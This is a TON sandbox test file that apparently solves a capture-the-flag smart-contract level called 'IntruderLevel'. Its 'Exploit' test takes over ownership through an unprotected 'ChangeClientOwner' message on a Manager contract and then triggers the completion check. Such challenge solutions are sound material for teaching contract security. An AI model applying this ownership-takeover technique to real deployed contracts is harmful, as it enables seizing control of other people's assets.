import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { IntruderLevel } from '../wrappers/wrappers/IntruderLevel';
import { Manager } from '../wrappers/wrappers/Manager';
import '@ton/test-utils';

describe('IntruderLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<IntruderLevel>;
    let manager: SandboxContract<Manager>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await IntruderLevel.fromInit(player.address, 0n));
        manager = blockchain.openContract(await Manager.fromInit(level.address, 0n));

        const deployResult = await level.send(
            owner.getSender(),
            {
                value: toNano('0.1'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: level.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit', async () => {
        await manager.send(
            player.getSender(),
            { value: toNano('0.1') },
            { $$type: 'ChangeClientOwner', newOwner: player.address },
        );

        await level.send(player.getSender(), { value: toNano('0.1') }, 'check');

        expect(await level.getCompleted()).toEqual(true);
    });
});
